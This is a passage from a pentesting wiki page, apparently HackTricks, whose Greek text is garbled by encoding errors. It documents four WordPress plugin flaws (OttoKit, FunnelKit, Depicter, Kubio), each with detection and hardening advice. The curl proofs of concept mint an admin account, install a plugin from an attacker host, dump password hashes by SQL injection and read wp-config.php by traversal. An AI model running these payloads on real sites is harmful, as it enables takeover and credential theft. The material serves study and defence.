## Î‘Î½Î±Î²Î¬Î¸Î¼Î¹ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ Ï‡Ï‰ÏÎ¯Ï‚ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Î¼Î­ÏƒÏ‰ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î±Ï‚ REST token/ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï Ï€Î¬Î½Ï‰ ÏƒÎµ Ï€ÏÎ¿Î²Î»Î­ÏˆÎ¹Î¼Î· Ï„Î±Ï…Ï„ÏŒÏ„Î·Ï„Î± (OttoKit/SureTriggers â‰¤ 1.0.82)

ÎšÎ¬Ï€Î¿Î¹Î± plugins ÎµÎºÎ¸Î­Ï„Î¿Ï…Î½ REST endpoints Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¿ÏÎ½ ÎµÏ€Î±Î½Î±Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¹Î¼Î± â€œconnection keysâ€ Î® tokens Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± ÎµÏ€Î±Î»Î·Î¸ÎµÏÎ¿Ï…Î½ Ï„Î¹Ï‚ Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„ÎµÏ‚ (capabilities) Ï„Î¿Ï… ÎºÎ±Î»Î¿ÏÎ½Ï„Î¿Ï‚. Î•Î¬Î½ Ï„Î¿ route Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹ÎµÎ¯ authentication Î¼ÏŒÎ½Î¿ Î²Î¬ÏƒÎµÎ¹ ÎµÎ½ÏŒÏ‚ Ï€ÏÎ¿Î²Î»Î­ÏˆÎ¹Î¼Î¿Ï…/Î¼Ï€Î¿ÏÎ¿ÏÎ¼ÎµÎ½Î¿Ï… Î½Î± Î¼Î±Î½Ï„Î­ÏˆÎ¿Ï…Î¼Îµ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÎ¿Ï (Ï€.Ï‡. username) ÎºÎ±Î¹ Î´ÎµÎ½ Î´ÎµÏƒÎ¼ÎµÏÎµÎ¹ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ ÏƒÎµ user/session Î¼Îµ Î­Î»ÎµÎ³Ï‡Î¿ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½, Î¿Ï€Î¿Î¹Î¿ÏƒÎ´Î®Ï€Î¿Ï„Îµ Î¼Î·-Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î± ÎºÎ»ÎµÎ¹Î´Î¯ ÎºÎ±Î¹ Î½Î± ÎºÎ±Î»Î­ÏƒÎµÎ¹ Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡ÎµÏ‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ (Ï€.Ï‡. Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± admin account, plugin actions â†’ RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC â€“ mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# â†’ {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Why itâ€™s exploitable
- Î•Ï…Î±Î¯ÏƒÎ¸Î·Ï„Î¿ REST route Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏ…Î¼Î­Î½Î¿ Î¼ÏŒÎ½Î¿ Î±Ï€ÏŒ low-entropy Î±Ï€ÏŒÎ´ÎµÎ¹Î¾Î· Ï„Î±Ï…Ï„ÏŒÏ„Î·Ï„Î±Ï‚ (username) Î® Î¼Îµ Î­Î»Î»ÎµÎ¹ÏˆÎ· permission_callback
- Î”ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÎµÏ€Î¹Î²Î¿Î»Î® capability; Ï„Î¿ minted key Î³Î¯Î½ÎµÏ„Î±Î¹ Î±Ï€Î¿Î´ÎµÎºÏ„ÏŒ Ï‰Ï‚ ÎºÎ±Î¸Î¿Î»Î¹ÎºÎ® Ï€Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ·

Detection checklist
- ÎšÎ¬Î½Ï„Îµ grep ÏƒÏ„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Ï„Î¿Ï… plugin Î³Î¹Î± register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- ÎŸÏ€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ route Ï€Î¿Ï… ÎµÎºÎ´Î¯Î´ÎµÎ¹ tokens/keys Î¼Îµ Î²Î¬ÏƒÎ· identity Ï€Î¿Ï… Ï€Î±ÏÎ­Ï‡ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ request (username/email) Ï‡Ï‰ÏÎ¯Ï‚ ÏƒÏÎ½Î´ÎµÏƒÎ· Î¼Îµ authenticated user Î® capability
- Î‘Î½Î±Î¶Î·Ï„Î®ÏƒÏ„Îµ Î¼ÎµÏ„Î­Ï€ÎµÎ¹Ï„Î± routes Ï€Î¿Ï… Î±Ï€Î¿Î´Î­Ï‡Î¿Î½Ï„Î±Î¹ Ï„Î¿ minted token/key Ï‡Ï‰ÏÎ¯Ï‚ server-side ÎµÎ»Î­Î³Ï‡Î¿Ï…Ï‚ capability

Hardening
- Î“Î¹Î± Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ privileged REST route: Î±Ï€Î±Î¹Ï„Î®ÏƒÏ„Îµ permission_callback Ï€Î¿Ï… ÎµÏ€Î¹Î²Î¬Î»ÎµÎ¹ current_user_can() Î³Î¹Î± Ï„Î·Î½ Î±Ï€Î±Î¹Ï„Î¿ÏÎ¼ÎµÎ½Î· capability
- ÎœÎ·Î½ ÎµÎºÎ´Î¯Î´ÎµÏ„Îµ long-lived keys Î±Ï€ÏŒ client-supplied identity; Î±Î½ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹, ÎµÎºÎ´ÏÏƒÏ„Îµ short-lived, user-bound tokens Î¼ÎµÏ„Î¬ Î±Ï€ÏŒ authentication ÎºÎ±Î¹ ÎµÎ»Î­Î³Î¾Ï„Îµ Î¾Î±Î½Î¬ Ï„Î¹Ï‚ capabilities ÎºÎ±Ï„Î¬ Ï„Î· Ï‡ÏÎ®ÏƒÎ·
- Î•Ï€Î¹ÎºÏ…ÏÏÏƒÏ„Îµ Ï„Î¿ user context Ï„Î¿Ï… ÎºÎ±Î»Î¿ÏÎ½Ï„Î± (wp_set_current_user is not sufficient alone) ÎºÎ±Î¹ Î±Ï€Î¿ÏÏÎ¯ÏˆÏ„Îµ requests ÏŒÏ€Î¿Ï… !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse â†’ unauthenticated arbitrary plugin installation (FunnelKit Automations â‰¤ 3.5.3)

Nonce Î±Ï€Î¿Ï„ÏÎ­Ï€Î¿Ï…Î½ CSRF, ÏŒÏ‡Î¹ authorization. Î•Î¬Î½ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Ï„Î¿ Ï€Î­ÏÎ±ÏƒÎ¼Î± ÎµÎ½ÏŒÏ‚ nonce Ï‰Ï‚ Ï€ÏÎ¬ÏƒÎ¹Î½Î¿ Ï†Ï‰Ï‚ ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Ï€Î±ÏÎ±Î»ÎµÎ¯Ï€ÎµÎ¹ Ï„Î¿Ï…Ï‚ ÎµÎ»Î­Î³Ï‡Î¿Ï…Ï‚ capability Î³Î¹Î± privileged operations (Ï€.Ï‡., install/activate plugins), Î¼Î·-ÎµÏ€Î±Î»Î·Î¸ÎµÏ…Î¼Î­Î½Î¿Î¹ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Î¹ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î¹ÎºÎ±Î½Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½ Î¼Î¹Î± Î±Î´ÏÎ½Î±Î¼Î· Î±Ï€Î±Î¯Ï„Î·ÏƒÎ· nonce ÎºÎ±Î¹ Î½Î± Ï†Ï„Î¬ÏƒÎ¿Ï…Î½ ÏƒÎµ RCE ÎµÎ³ÎºÎ±Î¸Î¹ÏƒÏ„ÏÎ½Ï„Î±Ï‚ Î­Î½Î± backdoored Î® ÎµÏ…Î¬Î»Ï‰Ï„Î¿ plugin.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce â€œpassesâ€
- Impact: full compromise via arbitrary plugin install/activation

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers Ï€Î¿Ï… Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î¿ÏÎ½ plugins/themes ÎºÎ±Î¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½ Î¼ÏŒÎ½Î¿ wp_verify_nonce()/check_admin_referer() Ï‡Ï‰ÏÎ¯Ï‚ capability check
- ÎŸÏ€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ code path Ï€Î¿Ï… Î¸Î­Ï„ÎµÎ¹ $skip_caps = true Î¼ÎµÏ„Î¬ Î±Ï€ÏŒ nonce validation

Hardening
- Î Î¬Î½Ï„Î± Î¸ÎµÏ‰ÏÎµÎ¯Ï„Îµ Ï„Î± nonces Î¼ÏŒÎ½Î¿ Ï‰Ï‚ CSRF tokensÂ· ÎµÏ€Î¹Î²Î¬Î»Î»ÎµÏ„Îµ capability checks Î±Î½ÎµÎ¾Î±ÏÏ„Î®Ï„Ï‰Ï‚ Ï„Î·Ï‚ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚ Ï„Î¿Ï… nonce
- Î‘Ï€Î±Î¹Ï„Î®ÏƒÏ„Îµ current_user_can('install_plugins') ÎºÎ±Î¹ current_user_can('activate_plugins') Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î¿Î½ installer code
- Î‘Ï€Î¿ÏÏÎ¯ÏˆÏ„Îµ Î¼Î· Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Â· Î±Ï€Î¿Ï†ÏÎ³ÎµÏ„Îµ Ï„Î·Î½ Î­ÎºÎ¸ÎµÏƒÎ· nopriv AJAX actions Î³Î¹Î± privileged flows

---

## ÎœÎ· Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ SQLi Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï… s (search) ÏƒÏ„Î¹Ï‚ depicter-* actions (Depicter Slider â‰¤ 3.6.1)

Î Î¿Î»Î»Î­Ï‚ depicter-* actions ÎºÎ±Ï„Î±Î½Î¬Î»Ï‰ÏƒÎ±Î½ Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ s (search) ÎºÎ±Î¹ Ï„Î· ÏƒÏ…Î½Î­Î´ÎµÏƒÎ±Î½ ÏƒÎµ SQL queries Ï‡Ï‰ÏÎ¯Ï‚ Ï€Î±ÏÎ±Î¼ÎµÏ„ÏÎ¿Ï€Î¿Î¯Î·ÏƒÎ·.

- Parameter: s (search)
- Flaw: Î¬Î¼ÎµÏƒÎ· ÏƒÏÎ½Î´ÎµÏƒÎ· ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÏÎ½ ÏƒÎµ WHERE/LIKE clauses; Î´ÎµÎ½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎ±Î½ prepared statements Î® sanitization
- Impact: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Î¨Î¬Î¾Ï„Îµ Î¼Îµ grep Î³Î¹Î± depicter-* action handlers ÎºÎ±Î¹ Î³Î¹Î± Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… $_GET['s'] Î® Ï„Î¿Ï… $_POST['s'] ÏƒÏ„Î¿ SQL
- Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± custom queries Ï€Î¿Ï… Ï€ÎµÏÎ½Î¹Î¿ÏÎ½Ï„Î±Î¹ ÏƒÏ„Î¿ $wpdb->get_results()/query() ÏŒÏ€Î¿Ï… Î³Î¯Î½ÎµÏ„Î±Î¹ concatenation Î¼Îµ Ï„Î¿ s

Hardening
- Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Îµ Ï€Î¬Î½Ï„Î± $wpdb->prepare() Î® wpdb placeholdersÂ· Î±Ï€Î¿ÏÏÎ¯Ï€Ï„ÎµÏ„Îµ Î¼Î· Î±Î½Î±Î¼ÎµÎ½ÏŒÎ¼ÎµÎ½Î¿Ï…Ï‚ metacharacters ÏƒÏ„Î¿ server-side
- Î ÏÎ¿ÏƒÎ¸Î­ÏƒÏ„Îµ Î±Ï…ÏƒÏ„Î·ÏÎ® allowlist Î³Î¹Î± Ï„Î¿ s ÎºÎ±Î¹ ÎºÎ±Î½Î¿Î½Î¹ÎºÎ¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ ÏƒÏ„Î¿ Î±Î½Î±Î¼ÎµÎ½ÏŒÎ¼ÎµÎ½Î¿ charset/length

---

## Unauthenticated Local File Inclusion Î¼Î­ÏƒÏ‰ Î¼Î·-ÎµÏ€Î¹ÎºÏ…ÏÏ‰Î¼Î­Î½Î·Ï‚ Î´Î¹Î±Î´ÏÎ¿Î¼Î®Ï‚ template/file (Kubio AI Page Builder â‰¤ 2.5.1)

Î— Î±Ï€Î¿Î´Î¿Ï‡Î® attacker-controlled Î´Î¹Î±Î´ÏÎ¿Î¼ÏÎ½ ÏƒÎµ Î­Î½Î± template parameter Ï‡Ï‰ÏÎ¯Ï‚ normalization/containment ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Î±Î½Î¬Î³Î½Ï‰ÏƒÎ· Î±Ï…Î¸Î±Î¯ÏÎµÏ„Ï‰Î½ Ï„Î¿Ï€Î¹ÎºÏÎ½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½, ÎºÎ±Î¹ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ Ï†Î¿ÏÎ­Ï‚ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎºÏÎ´Î¹ÎºÎ± Î±Î½ includable PHP/log Î±ÏÏ‡ÎµÎ¯Î± Ï†Î¿ÏÏ„Ï‰Î¸Î¿ÏÎ½ ÏƒÏ„Î· runtime.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: Ï‡Ï‰ÏÎ¯Ï‚ normalization/allowlisting; ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÏ„Î±Î¹ traversal
- Impact: Î±Ï€Î¿ÎºÎ¬Î»Ï…ÏˆÎ· secret (wp-config.php), Ï€Î¹Î¸Î±Î½ÏŒ RCE ÏƒÎµ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î± Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î± (log poisoning, includable PHP)

PoC â€“ Î±Î½Î¬Î³Î½Ï‰ÏƒÎ· wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Detection checklist
- Any handler concatenating request paths into include()/require()/read sinks without realpath() containment
- Look for traversal patterns (../) reaching outside the intended templates directory

Hardening
- Enforce allowlisted templates; resolve with realpath() and require str_starts_with(realpath(file), realpath(allowed_base))
- Normalize input; reject traversal sequences and absolute paths; use sanitize_file_name() only for filenames (not full paths)


## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Î Î¿Î»Î»Î±Ï€Î»Î­Ï‚ ÎºÏÎ¯ÏƒÎ¹Î¼ÎµÏ‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ ÎµÏ€Î¹Î´Î¹Î¿ÏÎ¸ÏÎ¸Î·ÎºÎ±Î½ ÏƒÏ„Î¿ WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Î£Ï€Î¬Î½Î¹Î± Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Privilege Escalation ÏƒÏ„Î¿ ASE Plugin Ï€Î¿Ï… ÎµÏ€Î·ÏÎ­Î±ÏƒÎµ 100k+ sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [ÎˆÎ»ÎµÎ³Ï‡Î¿Ï‚ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚ hosting: 87.8% Ï„Ï‰Î½ vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎ¿Î½Ï„Î±Î¹ ÎºÏÎ¯ÏƒÎ¹Î¼Î¿ WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [ÎŸÎ¹ Ï€Î¹Î¿ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Î¼Î­Î½ÎµÏ‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ WordPress Ï„Î¿Ï… Q3 2025 ÎºÎ±Î¹ Ï€ÏÏ‚ Ï„Î¿ RapidMitigate Ï„Î¹Ï‚ Î¼Ï€Î»ÏŒÎºÎ±ÏÎµ](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) â‰¤ 1.0.82 â€“ Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations â‰¤ 3.5.3 â€“ Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider â‰¤ 3.6.1 â€“ Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder â‰¤ 2.5.1 â€“ Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
